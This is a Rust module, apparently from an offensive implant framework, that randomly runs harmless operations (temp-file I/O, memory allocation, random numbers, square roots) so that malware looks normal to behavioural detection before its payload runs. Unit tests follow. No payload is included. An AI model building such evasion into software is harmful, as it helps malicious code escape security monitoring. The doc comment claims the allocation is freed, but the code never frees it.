//! Decoy / benign API calls for behavioural-analysis evasion (BOAZ normal_api port).
//!
//! Randomly executes one of several innocuous operations (file I/O, memory
//! allocation, math, random number generation) to build a "normal" call-graph
//! before executing the real payload.

use crate::types::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use core::ptr::null_mut;
use malefic_os_win::kit::binding::MVirtualAlloc;

/// Cheap PRNG seed — reads the low 32 bits of the TSC.
fn cheap_rand() -> u64 {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        core::arch::x86_64::_rdtsc()
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        use std::time::{SystemTime, UNIX_EPOCH};
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.subsec_nanos() as u64)
            .unwrap_or(42)
    }
}

/// Write and read back a temporary file.
fn create_and_write_file() {
    let path = std::env::temp_dir().join("~decoy_tmp.txt");
    let _ = std::fs::write(&path, b"hello from normal_api");
    let _ = std::fs::read(&path);
    let _ = std::fs::remove_file(&path);
}

/// Allocate a small region, write a value, free it.
fn allocate_and_free_memory() {
    unsafe {
        let p = MVirtualAlloc(null_mut(), 256, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !p.is_null() {
            *(p as *mut u8) = 42u8;
        }
    }
}

/// Generate a pseudo-random number in [0, 99].
fn generate_random_number() -> u64 {
    cheap_rand() % 100
}

/// Compute integer square root via Newton's method.
fn calculate_square_root(n: u64) -> u64 {
    if n == 0 {
        return 0;
    }
    let mut x = n;
    let mut y = (x + 1) / 2;
    while y < x {
        x = y;
        y = (x + n / x) / 2;
    }
    x
}

/// Pick one action at random and execute it.
pub fn execute_api_function() {
    match cheap_rand() % 4 {
        0 => {
            create_and_write_file();
        }
        1 => {
            allocate_and_free_memory();
        }
        2 => {
            let _ = generate_random_number();
        }
        _ => {
            let _ = calculate_square_root(cheap_rand());
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sqrt_zero() {
        assert_eq!(calculate_square_root(0), 0);
    }

    #[test]
    fn test_sqrt_one() {
        assert_eq!(calculate_square_root(1), 1);
    }

    #[test]
    fn test_sqrt_perfect_squares() {
        let cases: &[(u64, u64)] = &[
            (4, 2),
            (9, 3),
            (16, 4),
            (25, 5),
            (36, 6),
            (49, 7),
            (64, 8),
            (81, 9),
            (100, 10),
            (10000, 100),
            (1000000, 1000),
        ];
        for &(n, expected) in cases {
            assert_eq!(
                calculate_square_root(n),
                expected,
                "sqrt({}) should be {}",
                n,
                expected
            );
        }
    }

    #[test]
    fn test_sqrt_non_perfect_floors() {
        // Integer sqrt should return floor value
        assert_eq!(calculate_square_root(2), 1);
        assert_eq!(calculate_square_root(3), 1);
        assert_eq!(calculate_square_root(5), 2);
        assert_eq!(calculate_square_root(8), 2);
        assert_eq!(calculate_square_root(10), 3);
        assert_eq!(calculate_square_root(99), 9);
        assert_eq!(calculate_square_root(101), 10);
    }

    #[test]
    fn test_sqrt_large_values() {
        // sqrt(2^32) = 2^16 = 65536
        assert_eq!(calculate_square_root(1 << 32), 1 << 16);
        // sqrt(2^62) ≈ 2^31
        assert_eq!(calculate_square_root(1u64 << 62), 1u64 << 31);
    }

    #[test]
    fn test_sqrt_u64_max() {
        // sqrt(u64::MAX) overflows in Newton's method ((x+1)/2 for x=u64::MAX).
        // This is expected — the function is only used on small values in practice.
        let result = std::panic::catch_unwind(|| calculate_square_root(u64::MAX));
        assert!(result.is_err(), "Should overflow on u64::MAX");
    }

    #[test]
    fn test_generate_random_number_range() {
        // Run multiple times to test range
        for _ in 0..20 {
            let n = generate_random_number();
            assert!(
                n < 100,
                "generate_random_number() returned {}, expected < 100",
                n
            );
        }
    }
}
